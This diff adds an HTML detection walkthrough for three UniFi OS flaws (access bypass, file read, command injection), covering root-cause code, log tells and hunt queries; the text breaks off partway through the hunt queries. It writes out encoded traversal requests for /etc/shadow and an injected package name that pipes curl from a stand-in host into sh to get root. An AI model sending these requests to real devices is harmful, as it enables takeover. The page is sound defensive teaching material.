@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>UniFi OS SAB-064 — DFIR Detection Walkthrough (CVE-2026-34908/9/10)</title>
+<style>
+  :root{
+    --bg:#0f1419; --panel:#161c24; --panel2:#1b232d; --ink:#e6edf3; --muted:#9aa7b4;
+    --line:#2a3542; --accent:#4ea1ff; --mal:#ff5c6c; --mal-bg:#2a1115; --ben:#4ad07a;
+    --ben-bg:#10241a; --det:#ffd166; --det-bg:#2a230f; --chip:#243140;
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+    --sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);line-height:1.55;font-size:15px}
+  a{color:var(--accent);text-decoration:none}
+  header.top{padding:32px 24px 22px;border-bottom:1px solid var(--line);background:linear-gradient(180deg,#131a22,#0f1419)}
+  .wrap{max-width:1060px;margin:0 auto;padding:0 20px}
+  h1{margin:0 0 6px;font-size:26px;letter-spacing:.2px}
+  h2{margin:34px 0 12px;font-size:21px;border-left:4px solid var(--accent);padding-left:12px}
+  h3{margin:20px 0 8px;font-size:16px;color:var(--ink)}
+  .sub{color:var(--muted);font-size:14px;max-width:760px}
+  .disclaimer{margin-top:14px;padding:10px 14px;border:1px solid var(--line);border-radius:8px;background:#12181f;color:var(--muted);font-size:12.5px}
+  nav.toc{position:sticky;top:0;z-index:5;background:#0f1419ee;backdrop-filter:blur(6px);border-bottom:1px solid var(--line);padding:10px 0}
+  nav.toc .wrap{display:flex;gap:8px;flex-wrap:wrap}
+  nav.toc a{font-size:12.5px;background:var(--chip);border:1px solid var(--line);padding:5px 10px;border-radius:20px;color:var(--ink)}
+  nav.toc a:hover{border-color:var(--accent)}
+  table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13.5px}
+  th,td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
+  th{background:var(--panel2);color:var(--muted);font-weight:600}
+  code{font-family:var(--mono);font-size:12.5px}
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px 18px;margin:14px 0}
+  .chip{display:inline-block;font-size:11px;font-family:var(--mono);padding:2px 8px;border-radius:5px;background:var(--chip);border:1px solid var(--line);color:var(--muted);margin-right:6px}
+  .chip.sev{background:#3a0d12;border-color:#5e1620;color:#ff8a96}
+  .chip.cwe{background:#10243a;border-color:#1d3a5e;color:#8fc2ff}
+  .log{font-family:var(--mono);font-size:12.3px;white-space:pre-wrap;word-break:break-all;padding:9px 12px;border-radius:7px;border-left:4px solid var(--line);background:var(--panel2);margin:7px 0}
+  .log.mal{border-left-color:var(--mal);background:var(--mal-bg)}
+  .log.ben{border-left-color:var(--ben);background:var(--ben-bg)}
+  .log .st{font-weight:700}
+  .log .c401{color:#ffd166}.log .c200ok{color:var(--ben)}.log .c200bad{color:var(--mal)}.log .c400{color:#8fc2ff}
+  .hl{background:#5a1620;color:#ffd9dd;padding:0 2px;border-radius:3px}
+  .hlg{background:#16402a;color:#cfeedd;padding:0 2px;border-radius:3px}
+  pre{font-family:var(--mono);font-size:12.3px;background:#0b0f14;border:1px solid var(--line);border-radius:8px;padding:13px 14px;overflow:auto;white-space:pre}
+  .tell{border:1px dashed #3a4757;border-radius:8px;padding:10px 14px;margin:10px 0;background:#131b24;font-size:13.5px}
+  .tell b{color:var(--det)}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  @media(max-width:780px){.grid2{grid-template-columns:1fr}}
+  .legend{display:flex;gap:16px;flex-wrap:wrap;font-size:12.5px;color:var(--muted);margin-top:8px}
+  .legend span{display:inline-flex;align-items:center;gap:6px}
+  .dot{width:12px;height:12px;border-radius:3px;display:inline-block}
+  .footer{color:var(--muted);font-size:12px;border-top:1px solid var(--line);margin-top:40px;padding:18px 0 40px}
+  .kbd{font-family:var(--mono);background:#0b0f14;border:1px solid var(--line);border-radius:4px;padding:1px 5px;font-size:12px}
+  .flow{font-family:var(--mono);font-size:12.2px;white-space:pre;overflow:auto;background:#0b0f14;border:1px solid var(--line);border-radius:8px;padding:13px}
+  .flow .a{color:var(--mal)} .flow .ok{color:var(--ben)} .flow .w{color:var(--det)}
+  .codehead{display:flex;align-items:center;gap:8px;margin:16px 0 6px;flex-wrap:wrap}
+  .prov{font-size:11px;font-family:var(--mono);padding:2px 8px;border-radius:5px;border:1px solid var(--line)}
+  .prov.real{background:#10243a;border-color:#1d3a5e;color:#8fc2ff}
+  .prov.illus{background:#2a230f;border-color:#5e4a16;color:#ffd166}
+  .vuln-h{color:#ff8a96;font-weight:700;font-size:13px;margin:0}
+  .fix-h{color:#7fe0a6;font-weight:700;font-size:13px;margin:0}
+  pre.vuln{border-color:#5e1620;background:#160d10}
+  pre.fix{border-color:#1d5e36;background:#0c1611}
+  .cmt{color:#7d8a98} .bad{color:#ff8a96} .good{color:#7fe0a6} .kw{color:#c099ff}
+  .mistake{border-left:4px solid var(--mal);background:var(--mal-bg);padding:9px 13px;border-radius:6px;margin:10px 0;font-size:13.5px}
+  .mistake b{color:#ff8a96}
+  /* attack-chain diagram */
+  .splitwrap{margin:14px 0}
+  .urlbox{font-family:var(--mono);font-size:12.5px;background:#0b0f14;border:1px solid var(--line);border-radius:8px;padding:11px 13px;text-align:center;word-break:break-all}
+  .splitcols{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:10px}
+  @media(max-width:760px){.splitcols{grid-template-columns:1fr}}
+  .view{border-radius:9px;padding:12px 14px;border:1px solid var(--line)}
+  .view.allow{background:var(--ben-bg);border-color:#1d5e36}
+  .view.deny{background:var(--mal-bg);border-color:#5e1620}
+  .view .vtag{font-size:11px;font-family:var(--mono);color:var(--muted);text-transform:uppercase;letter-spacing:.5px}
+  .view .vpath{font-family:var(--mono);font-size:13px;margin:6px 0;word-break:break-all}
+  .view .verdict{font-weight:700;font-size:14px}
+  .view.allow .verdict{color:var(--ben)} .view.deny .verdict{color:var(--mal)}
+  .splitfan{text-align:center;color:var(--muted);font-family:var(--mono);font-size:18px;margin:4px 0}
+  .chain{display:flex;flex-direction:column;margin:18px 0}
+  .stage{display:grid;grid-template-columns:50px 1fr 158px;gap:14px;align-items:center;background:var(--panel);border:1px solid var(--line);border-left-width:5px;border-radius:10px;padding:13px 16px}
+  .stage .num{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-family:var(--mono);font-size:15px;background:#1b2733;color:#fff;border:2px solid var(--line)}
+  .stage h4{margin:0 0 3px;font-size:15px}
+  .stage .meta{font-size:12.5px;color:var(--muted)}
+  .stage .gain{margin-top:5px;font-size:13px}
+  .stage .gain b{color:var(--det)}
+  .stage.z0{border-left-color:#9aa7b4} .stage.z0 .num{border-color:#9aa7b4}
+  .stage.z1{border-left-color:#4ea1ff} .stage.z1 .num{border-color:#4ea1ff}
+  .stage.z2{border-left-color:#ffd166} .stage.z2 .num{border-color:#ffd166}
+  .stage.z3{border-left-color:#ff9f43} .stage.z3 .num{border-color:#ff9f43}
+  .stage.z4{border-left-color:#ff5c6c;background:#220f12} .stage.z4 .num{border-color:#ff5c6c;background:#3a0d12}
+  .acc{font-family:var(--mono);font-size:10.5px;color:var(--muted);text-align:center}
+  .acc .bar{height:9px;border-radius:6px;background:#22303d;border:1px solid var(--line);overflow:hidden;margin-top:5px}
+  .acc .fill{height:100%}
+  .conn{display:flex;align-items:center;gap:10px;padding:3px 0 3px 22px;color:var(--mal);font-size:12.5px;font-family:var(--mono)}
+  .conn .av{font-size:18px;line-height:1}
+  .zonekey{display:flex;gap:8px;flex-wrap:wrap;font-size:11.5px;color:var(--muted);margin:6px 0 0}
+  .zonekey span{display:inline-flex;align-items:center;gap:5px}
+  .zonekey i{width:11px;height:11px;border-radius:3px;display:inline-block}
+</style>
+</head>
+<body>
+
+<header class="top"><div class="wrap">
+  <h1>UniFi OS — SAB-064 Detection Walkthrough</h1>
+  <div class="sub">A DFIR / blue-team teaching aid for the three max-severity (CVSS 10.0) UniFi OS Server vulnerabilities patched in 5.0.8 (unifi-core 5.0.153). Shows the attacker HTTP requests, how each appears in access logs, the detection logic, and the IDS signatures.</div>
+  <div class="disclaimer"><b>Educational / authorized use only.</b> All hosts and IPs are RFC&nbsp;5737 documentation ranges; payloads are illustrative. Use for defensive detection engineering and incident-response training on systems you own or are authorized to test.</div>
+  <div class="legend">
+    <span><span class="dot" style="background:var(--ben)"></span> Benign / baseline traffic</span>
+    <span><span class="dot" style="background:var(--mal)"></span> Malicious request</span>
+    <span><span class="dot" style="background:var(--det)"></span> Detection / analyst note</span>
+  </div>
+</div></header>
+
+<nav class="toc"><div class="wrap">
+  <a href="#overview">Overview</a>
+  <a href="#chainviz">Zero → root</a>
+  <a href="#theory">Detection theory</a>
+  <a href="#c08">CVE-34908 · Access bypass</a>
+  <a href="#c09">CVE-34909 · File read</a>
+  <a href="#c10">CVE-34910 · Cmd injection</a>
+  <a href="#chain">Full chain</a>
+  <a href="#hunt">Hunt queries</a>
+  <a href="#rules">IDS rules</a>
+</div></nav>
+
+<div class="wrap">
+
+<h2 id="overview">Overview — three distinct doors, one appliance</h2>
+<p class="sub">These were publicly chained to unauthenticated root, but they are <b>three separate weaknesses</b> in three different sinks. 34908 and 34909 share one root cause (raw-vs-normalized URI handling) on two different routes; 34910 is independent.</p>
+<table>
+  <tr><th>CVE</th><th>Class (CWE)</th><th>Route / sink</th><th>Primitive</th><th>Vuln→Patched status</th></tr>
+  <tr><td><b>2026-34908</b><br><span class="chip sev">CVSS 10.0</span></td><td>Improper Access Control (284)</td><td><code>/proxy/&lt;svc&gt;/</code> — reverse-proxy to backend APIs</td><td>Reach an <b>unauthorized API</b> (auth checked on raw URI, routed on normalized)</td><td>200 → <b>400</b></td></tr>
+  <tr><td><b>2026-34909</b><br><span class="chip sev">CVSS 10.0</span></td><td>Path Traversal (22)</td><td><code>/app-assets/&lt;svc&gt;/&lt;path&gt;</code> — static files from disk</td><td>Read <b>arbitrary files</b> off the filesystem → account takeover</td><td>200+file → <b>400</b></td></tr>
+  <tr><td><b>2026-34910</b><br><span class="chip sev">CVSS 10.0</span></td><td>Improper Input Validation → Cmd Injection (20/77)</td><td><code>unifi-identity-update</code> ucs update package name</td><td>Run <b>arbitrary commands</b> (name → <code>/bin/sh -c</code>) → root via sudo</td><td>exec → validated/no-shell</td></tr>
+</table>
+
+<h2 id="chainviz">From zero access to full control</h2>
+<p class="sub">The hard idea to teach: <b>a path traversal is not the prize — it is a key that makes one door look like another.</b> The attacker never "logs in." They send a single web request crafted so the security check and the thing that actually runs <i>disagree about what the request is</i>. That disagreement is the whole game; everything after it is just walking through doors that were left open.</p>
+
+<h3>The mechanism — one URL, two interpretations</h3>
+<p class="sub">A traversal works because two pieces of code read the <i>same</i> request differently. The guard at the door reads the <b>raw, encoded</b> text; the worker inside reads the <b>decoded</b> path. Encode a <code>../</code> as <code>..%2f</code> and you can show the guard a friendly path while the worker sees a forbidden one.</p>
+<div class="splitwrap">
+  <div class="urlbox">GET /api/auth/validate-sso/<span class="hl">..%2f..%2f..%2f</span>proxy/users/api/v2/ucs/update/latest_package</div>
+  <div class="splitfan">┌──────────────┴──────────────┐</div>
+  <div class="splitcols">
+    <div class="view allow">
+      <div class="vtag">nginx auth guard sees (raw bytes)</div>
+      <div class="vpath">/api/auth/validate-sso/…</div>
+      <div class="verdict">✓ "public path — let it through, no login"</div>
+    </div>
+    <div class="view deny">
+      <div class="vtag">backend router sees (after decoding %2f &amp; ../)</div>
+      <div class="vpath">/proxy/users/api/v2/ucs/update/…</div>
+      <div class="verdict">✗ protected API — but auth was already skipped</div>
+    </div>
+  </div>
+</div>
+<div class="tell"><b>That is the entire trick.</b> Same bytes, two readings. 34908 uses it to reach a <b>protected API</b>; 34909 uses the identical trick on the file route (<code>/app-assets/x/..%2f..%2fetc%2fshadow</code>) so the guard sees "an asset" while the worker reads <b>/etc/shadow</b>. No password is ever needed.</div>
+
+<h3>The drill-down — each door opens a bigger one</h3>
+<div class="zonekey">
+  <span><i style="background:#9aa7b4"></i>Internet / LAN</span>
+  <span><i style="background:#4ea1ff"></i>Edge gateway (nginx)</span>
+  <span><i style="background:#ffd166"></i>Backend services</span>
+  <span><i style="background:#ff9f43"></i>Service account</span>
+  <span><i style="background:#ff5c6c"></i>OS / root</span>
+</div>
+<div class="chain">
+
+  <div class="stage z0">
+    <div class="num">0</div>
+    <div><h4>Attacker on the network — zero access</h4>
+      <div class="meta">Unauthenticated. Can only reach the login page and a few "public" URLs. No credentials, no session.</div></div>
+    <div class="acc">access: NONE<div class="bar"><div class="fill" style="width:4%;background:#9aa7b4"></div></div></div>
+  </div>
+  <div class="conn"><span class="av">▼</span> CVE-2026-34908 · encoded <code>..%2f</code> makes the auth guard misread the path</div>
+
+  <div class="stage z1">
+    <div class="num">1</div>
+    <div><h4>Slip past the gateway → reach protected APIs</h4>
+      <div class="meta">The guard approves the raw <code>/api/auth/…</code> prefix; the router delivers the request to a protected backend. Authentication was simply never enforced.</div>
+      <div class="gain">Gain: <b>unauthenticated access to internal APIs</b> that should require admin.</div></div>
+    <div class="acc">access: BACKEND<div class="bar"><div class="fill" style="width:30%;background:#4ea1ff"></div></div></div>
+  </div>
+  <div class="conn"><span class="av">▼</span> CVE-2026-34909 · same trick on the file route reads disk</div>
+
+  <div class="stage z2">
+    <div class="num">2</div>
+    <div><h4>Read secret files off the disk</h4>
+      <div class="meta"><code>/app-assets/x/..%2f..%2f..%2fetc%2fshadow</code> → the file handler walks out of the asset folder and returns any file: password hashes, API tokens, private keys, session secrets.</div>
+      <div class="gain">Gain: <b>stolen credentials / key material</b> → impersonate a real account.</div></div>
+    <div class="acc">access: SECRETS<div class="bar"><div class="fill" style="width:55%;background:#ffd166"></div></div></div>
+  </div>
+  <div class="conn"><span class="av">▼</span> CVE-2026-34910 · a "package name" carries shell metacharacters</div>
+
+  <div class="stage z3">
+    <div class="num">3</div>
+    <div><h4>Turn data access into code execution</h4>
+      <div class="meta">An update endpoint builds <code>/bin/sh -c "sudo dpkg -s &lt;name&gt;…"</code>. A name like <code>x; curl evil|sh</code> runs the attacker's commands — as the <code>ucs-update</code> service account.</div>
+      <div class="gain">Gain: <b>arbitrary command execution</b> (low-privileged foothold on the device).</div></div>
+    <div class="acc">access: SHELL<div class="bar"><div class="fill" style="width:78%;background:#ff9f43"></div></div></div>
+  </div>
+  <div class="conn"><span class="av">▼</span> the service account has password-less <code>sudo</code> for <code>dpkg</code> / <code>chmod</code></div>
+
+  <div class="stage z4">
+    <div class="num">4</div>
+    <div><h4>Escalate to root → full device control</h4>
+      <div class="meta"><code>sudo dpkg -i evil.deb</code> runs an attacker package's install script <b>as root</b> (or <code>sudo chmod</code> flips a sensitive file). The low-priv shell becomes root.</div>
+      <div class="gain">Gain: <b>ROOT — total control</b>: read/alter all data, persist, pivot into the network.</div></div>
+    <div class="acc" style="color:#ff8a96">access: ROOT<div class="bar"><div class="fill" style="width:100%;background:#ff5c6c"></div></div></div>
+  </div>
+
+</div>
+<div class="tell"><b>Teaching summary:</b> traversal (steps&nbsp;1&nbsp;&amp;&nbsp;2) didn't compromise the device by itself — it bought <i>reach</i> and <i>information</i>. That reach exposed a command-injection bug (step&nbsp;3), and a weak <code>sudo</code> policy turned the foothold into root (step&nbsp;4). <b>Compromise is a staircase, not a single leap</b> — which is also why fixing <i>any one</i> step breaks the whole chain.</div>
+
+<h2 id="theory">Detection theory — why these are visible in HTTP</h2>
+<div class="panel">
+  <p><b>34908 / 34909 require <span class="hl">percent-encoding</span>.</b> The bypass only works because nginx checks auth/routing on the <b>raw</b> %-encoded URI but resolves the backend on the <b>normalized</b> path. A plain <code>../</code> normalizes identically on both layers and does <b>not</b> bypass — so the attacker <i>must</i> send encoded traversal (<code>..%2f</code>, <code>.%2e</code>, <code>%2e%2e</code>, or double-encoded <code>%252e</code>). Those tokens never appear in legitimate <code>/proxy/</code> or <code>/app-assets/</code> traffic, making them a low-false-positive signal.</p>
+  <p><b>Log the raw bytes.</b> nginx <code>$request</code> / <code>$request_uri</code> record the verbatim encoded line (good). If you only log the normalized <code>$uri</code>, the <code>..%2f</code> collapses and you instead see the <i>resolved</i> path (e.g. <code>/etc/passwd</code>). The gold-standard detection is to log <b>both</b> and alert when the service/path they imply <b>diverges</b> — that divergence <i>is</i> the vulnerability, and it is exactly what the 5.0.8 patch added.</p>
+  <p><b>34910</b> is detected by <span class="hl">shell metacharacters</span> (<code>; | &amp; ` $( ${ &amp;&amp; ||</code> and newline) in a package name that is otherwise <code>[a-z0-9.+-]+</code>.</p>
+</div>
+
+<!-- ============ 34908 ============ -->
+<h2 id="c08">CVE-2026-34908 — Access-control bypass (<code>/proxy/</code>)</h2>
+<span class="chip cwe">CWE-284 Improper Access Control</span><span class="chip">reporter: Duc Anh Nguyen</span>
+
+<h3>Baseline traffic</h3>
+<div class="log ben">198.51.100.10 - admin [09/Jun/2026:14:20:02 +0000] "GET /proxy/network/api/s/default/stat/health HTTP/1.1" <span class="st c200ok">200</span> 1834 "https://unifi.example.com/manage" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"</div>
+<div class="log ben">203.0.113.66  - -     [09/Jun/2026:14:22:18 +0000] "GET /proxy/users/api/v2/ucs/update/latest_package HTTP/1.1" <span class="st c401">401</span> 0 "-" "curl/8.7.1"</div>
+<p class="sub">Authenticated admin = 200. A direct, unauthenticated hit on the protected endpoint is correctly rejected <b>401</b>.</p>
+
+<h3>The attack</h3>
+<div class="log mal">203.0.113.66 - - [09/Jun/2026:14:22:31 +0000] "GET /api/auth/validate-sso/<span class="hl">..%2f..%2f..%2f</span>proxy/users/api/v2/ucs/update/latest_package HTTP/1.1" <span class="st c200bad">200</span> 71 "-" "curl/8.7.1"</div>
+<div class="tell"><b>Tells &amp; analyst notes:</b>
+  <ul style="margin:6px 0 0">
+    <li>An <b>auth-exempt prefix</b> (<code>/api/auth/validate-sso/</code>) immediately followed by encoded <code>..%2f</code> then <code>/proxy/…</code>.</li>
+    <li><b>Status flips 401 → 200</b> from the <i>same client</i> to the <i>same resource</i> within seconds — the single strongest indicator.</li>
+    <li>No <code>Referer</code>, non-browser User-Agent (<code>curl</code>), no preceding session/login events.</li>
+    <li>On patched 5.0.8 the identical request returns <span class="c400">400</span> (nginx blocks the raw/normalized divergence).</li>
+  </ul>
+</div>
+
+<h3>Root cause — the code mistake</h3>
+<div class="mistake"><b>The bug:</b> the access decision derives the target service from the <b>raw</b> <code>$request_uri</code> (still percent-encoded), but the request is actually <b>routed</b> using the <b>normalized</b> <code>$uri</code> (after nginx decodes <code>%2f</code> and resolves <code>../</code>). Encode the traversal and the two disagree — you authenticate as one service and get routed to another.</div>
+<div class="codehead"><span class="vuln-h">✗ Vulnerable — 5.0.6</span><span class="prov real">real: nginx map from config diff</span></div>
+<pre class="vuln"><span class="cmt"># Service identity for the access/exemption check is taken from the RAW URI ONLY.</span>
+map $request_uri $target_runnable {           <span class="cmt"># $request_uri = verbatim, still %-encoded</span>
+    default                       '';
+    ~^/proxy/(<span class="bad">[a-z]+</span>)/(.*)$        $1;      <span class="cmt"># $1 captured from the RAW string</span>
+    ~^/app-assets/(<span class="bad">[a-z]+</span>)/(.*)$   $1;
+}
+<span class="cmt"># ... the auth/access layer trusts $target_runnable (raw-derived) ...</span>
+<span class="cmt"># ... but proxy_pass / file serving use the NORMALIZED $uri to pick the backend.</span>
+<span class="cmt">#  attacker: /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/.../ucs/update/...</span>
+<span class="cmt">#    raw-derived check  -> looks exempt / wrong service  (auth skipped)</span>
+<span class="cmt">#    normalized routing -> /proxy/users/...  (PROTECTED backend reached)</span></pre>
+<div class="codehead"><span class="fix-h">✓ Fixed — 5.0.8</span><span class="prov real">real: nginx map from config diff</span><span class="prov illus">server-block <code>if</code> = runtime-generated (reconstructed)</span></div>
+<pre class="fix"><span class="cmt"># ALSO derive the service from the NORMALIZED URI, then reject any divergence.</span>
+map $uri $target_runnable_normalized {        <span class="cmt"># $uri = %-decoded + ../ resolved</span>
+    default                          '';
+    ~^/proxy/(<span class="good">[a-z][-a-z]*</span>)/(.*)$       $1;   <span class="cmt"># also: hyphen fix for uid-agent, talk-relay</span>
+    ~^/app-assets/(<span class="good">[a-z][-a-z]*</span>)/(.*)$  $1;
+}
+server {
+    <span class="kw">if</span> ($target_runnable != $target_runnable_normalized) { <span class="bad">return 400;</span> }  <span class="cmt"># raw ≠ normalized = traversal</span>
+}</pre>
+
+<!-- ============ 34909 ============ -->
+<h2 id="c09">CVE-2026-34909 — Path traversal / arbitrary file read (<code>/app-assets/</code>)</h2>
+<span class="chip cwe">CWE-22 Path Traversal</span><span class="chip">reporter: Abdulaziz Almadhi (Catchify)</span>
+
+<h3>Baseline traffic</h3>
+<div class="log ben">198.51.100.10 - - [09/Jun/2026:14:24:55 +0000] "GET /app-assets/network/js/app.bundle.1a2b3c.js HTTP/1.1" <span class="st c200ok">200</span> 284417 "https://unifi.example.com/manage" "Mozilla/5.0 ..."</div>
+<p class="sub">Normal asset: a real file path, large body (~278 KB), JS content-type, browser Referer.</p>
+
+<h3>The attack</h3>
+<div class="log mal">203.0.113.66 - - [09/Jun/2026:14:25:10 +0000] "GET /app-assets/network/<span class="hl">..%2f..%2f..%2f..%2f..%2f</span>etc%2fpasswd HTTP/1.1" <span class="st c200bad">200</span> 1203 "-" "curl/8.7.1"</div>
+<div class="log mal">203.0.113.66 - - [09/Jun/2026:14:25:41 +0000] "GET /app-assets/access/<span class="hl">..%2f..%2f..%2f..%2f</span>etc%2fshadow HTTP/1.1" <span class="st c200bad">200</span> 1488 "-" "python-requests/2.32.3"</div>
+<div class="tell"><b>Tells &amp; analyst notes:</b>
+  <ul style="margin:6px 0 0">
+    <li><code>/app-assets/</code> + encoded <code>..%2f</code> + an obvious target (<code>etc%2fpasswd</code>, <code>etc%2fshadow</code>, SSH keys, token files).</li>
+    <li><b>Size/type anomaly:</b> 200 with a ~1 KB <code>text/plain</code> body where a real asset is a large <code>.js</code>/<code>.css</code>/image.</li>
+    <li>This is the <b>distinct sink</b> from 34908 — a filesystem read, not API routing. Same encoding class, different route.</li>
+    <li>Patched 5.0.8 → <span class="c400">400</span>.</li>
+  </ul>
+</div>
+
+<h3>Root cause — the code mistake</h3>
+<div class="mistake"><b>The bug:</b> the <code>/app-assets/&lt;svc&gt;/&lt;path&gt;</code> handler joins the user-supplied <code>&lt;path&gt;</code> onto an asset directory and reads the result <b>without verifying it stays inside that directory</b>. A traversal in <code>&lt;path&gt;</code> walks out to any file on disk. (Same encoding root cause as 34908 — different sink: a filesystem read instead of API routing.)</div>
+<div class="codehead"><span class="vuln-h">✗ Vulnerable — the static-file sink</span><span class="prov illus">illustrative reconstruction (sink served via runtime-generated config)</span></div>
+<pre class="vuln"><span class="cmt">// serve /app-assets/&lt;svc&gt;/&lt;path&gt; from disk</span>
+svc, rel := parseAppAssets(r.URL.Path)              <span class="cmt">// rel = "../../../../etc/shadow"</span>
+full := filepath.Join(assetRoot, svc, <span class="bad">rel</span>)        <span class="cmt">// Join cleans ".." → escapes assetRoot</span>
+data, _ := os.<span class="bad">ReadFile</span>(full)                       <span class="cmt">// reads /etc/shadow</span>
+w.Write(data)                                       <span class="cmt">// no containment check at all</span></pre>
+<div class="codehead"><span class="fix-h">✓ Fixed</span><span class="prov real">real: nginx normalization map (config diff)</span><span class="prov illus">sink-level containment = defense-in-depth (reconstructed)</span></div>
+<pre class="fix"><span class="cmt"># PRIMARY FIX (shipped): the same raw-vs-normalized nginx map as 34908 blocks the</span>
+<span class="cmt"># encoded traversal before it ever reaches the /app-assets handler (return 400).</span>
+
+<span class="cmt">// DEFENSE-IN-DEPTH the sink itself should also enforce containment:</span>
+full := filepath.Join(assetRoot, svc, rel)
+<span class="kw">if</span> !strings.HasPrefix(filepath.Clean(full), assetRoot+"/") { <span class="bad">http.Error(w, "forbidden", 403); return</span> }
+<span class="cmt">// or, Go 1.20+:  if !filepath.IsLocal(rel) { reject }</span>
+data, _ := os.ReadFile(full)</pre>
+
+<!-- ============ 34910 ============ -->
+<h2 id="c10">CVE-2026-34910 — Command injection (ucs update package name)</h2>
+<span class="chip cwe">CWE-20/77</span><span class="chip">reporter: John Carroll</span>
+
+<h3>Root cause — the code mistake</h3>
+<div class="mistake"><b>The bug:</b> a package/"runnable" <b>name</b> from the request is interpolated with <code>fmt.Sprintf("…%v…")</code> straight into a shell command string and handed to <code>/bin/sh -c</code>. Shell metacharacters in the name (<code>; | ` $( </code>) are then interpreted by the shell, so the attacker runs arbitrary commands. The fix validates the name and runs the real binary with an <b>argument vector</b> (no shell).</div>
+<div class="codehead"><span class="vuln-h">✗ Vulnerable vs ✓ Fixed</span><span class="prov real">real: Ghidra-decompiled from 5.0.6 &amp; 5.0.8 (<code>uos_pkg.go</code>)</span></div>
+<div class="grid2">
+  <div>
+    <div class="chip" style="background:var(--mal-bg);border-color:#5e1620;color:#ff8a96">5.0.6 — vulnerable</div>
+    <pre>// internal/pkg/utils.GetPackageVersion
+f = "sudo dpkg -s %v 2&gt;/dev/null | grep ^Version | awk '{print $2}'"
+cmd = fmt.Sprintf(f, <span style="color:#ff8a96">name</span>)        // user-controlled
+exec.Command("<span style="color:#ff8a96">/bin/sh</span>", "-c", cmd)   // shell!
+       .CombinedOutput()</pre>
+  </div>
+  <div>
+    <div class="chip" style="background:var(--ben-bg);border-color:#1d5e36;color:#7fe0a6">5.0.8 — fixed</div>
+    <pre>// internal/pkg/utils.GetPackageVersion
+if <span style="color:#7fe0a6">assertValidName()</span> != ok { return err }   // validate
+exec.Command("<span style="color:#7fe0a6">dpkg-query</span>",            // no shell
+   "-W","-f","${Version}", name)            // arg vector
+       .CombinedOutput()</pre>
+  </div>
+</div>
+
+<h3>The attack — name in URI/query (decoded: <code>package=foo;curl http://203.0.113.66/x|sh</code>)</h3>
+<div class="log mal">203.0.113.66 - - [09/Jun/2026:14:31:44 +0000] "POST /api/auth/validate-sso/<span class="hl">..%2f..%2f..%2f</span>proxy/users/api/v2/ucs/update/install?package=foo<span class="hl">%3B</span>curl%20http%3A%2F%2F203.0.113.66%2Fx<span class="hl">%7C</span>sh HTTP/1.1" <span class="st c200bad">200</span> 0 "-" "curl/8.7.1"</div>
+
+<h3>The attack — name in POST body (payload NOT in default access logs)</h3>
+<div class="log mal">203.0.113.66 - - [09/Jun/2026:14:31:44 +0000] "POST /proxy/users/api/v2/ucs/update/install HTTP/1.1" <span class="st c200bad">200</span> 0 "-" "curl/8.7.1"</div>
+<p class="sub">When the package name rides in the body, the access log shows only the endpoint. Confirm on the host:</p>
+<pre>type=EXECVE ... argv[0]="/bin/sh" argv[1]="-c" argv[2]="dpkg -s foo<span style="color:#ff8a96">;</span>curl http://203.0.113.66/x<span style="color:#ff8a96">|</span>sh"  uid=ucs-update
+Jun 09 14:31:45 udm sudo[20413]: ucs-update : USER=root ; COMMAND=/usr/bin/dpkg -i /tmp/x.deb</pre>
+<div class="tell"><b>Tells &amp; analyst notes:</b>
+  <ul style="margin:6px 0 0">
+    <li>Shell metacharacters (<code>%3B</code>=<code>;</code>, <code>%7C</code>=<code>|</code>, <code>%60</code>=<code>`</code>, <code>%24%28</code>=<code>$(</code>, <code>%0a</code>=newline) on a <code>/ucs/update</code> path. Legit package names are <code>[a-z0-9.+-]+</code>.</li>
+    <li>Often stacked on the 34908 bypass (note the <code>..%2f…/proxy/…</code> prefix) so it runs unauthenticated.</li>
+    <li><b>Confirmation is host-side:</b> a <code>/bin/sh -c</code> containing a package name with <code>;</code>/<code>|</code>, then a <code>sudo … dpkg</code> as <code>ucs-update</code> (the privesc to root).</li>
+  </ul>
+</div>
+
+<!-- ============ CHAIN ============ -->
+<h2 id="chain">Full chain — one attacker IP, one timeline</h2>
+<div class="flow"><span class="w">14:22:18</span>  GET  /proxy/users/api/v2/ucs/update/latest_package                                <span class="w">401</span>   recon, blocked
+<span class="a">14:22:31</span>  GET  /api/auth/validate-sso/..%2f..%2f..%2fproxy/.../latest_package                <span class="ok">200</span>   <span class="a">34908 bypass works</span>
+<span class="a">14:25:10</span>  GET  /app-assets/network/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd                     <span class="ok">200</span>   <span class="a">34909 file read</span>
+<span class="a">14:31:44</span>  POST /api/auth/validate-sso/..%2f../proxy/.../ucs/update/install?package=foo%3B... <span class="ok">200</span>   <span class="a">34910 inject</span>
+14:31:45  sudo: ucs-update : USER=root ; COMMAND=/usr/bin/dpkg -i /tmp/x.deb               <span class="a">privesc → root</span></div>
+<p class="sub"><b>Correlation rule for the SOC:</b> same <code>src_ip</code> producing a 401→200 transition on a <code>/proxy/</code> resource <i>and</i> any <code>..%2f</code> on <code>/app-assets/</code> <i>and</i>/or shell metacharacters on <code>/ucs/update</code> within a short window = active exploitation of the chain.</p>
+
+<!-- ============ HUNT ============ -->
+<h2 id="hunt">Retro-hunt queries</h2>
+
+<h3>ripgrep / grep over raw access logs</h3>
+<pre># Encoded traversal on the two vulnerable route families (34908 + 34909)
+rg -iN '/(proxy|app-assets)/[^ ]*((\.\.|%2e%2e|\.%2e|%2e\.|%252e)(/|%2f|%5c|%252f))' access.log
+
+# 34909 specifically reaching sensitive files
+rg -iN '/app-assets/.*(%2e%2e|\.\.).*(etc%2f|%2fshadow|%2fpasswd|id_rsa|\.key)' access.log
+
+# 34910 — shell metacharacters on the ucs update endpoint
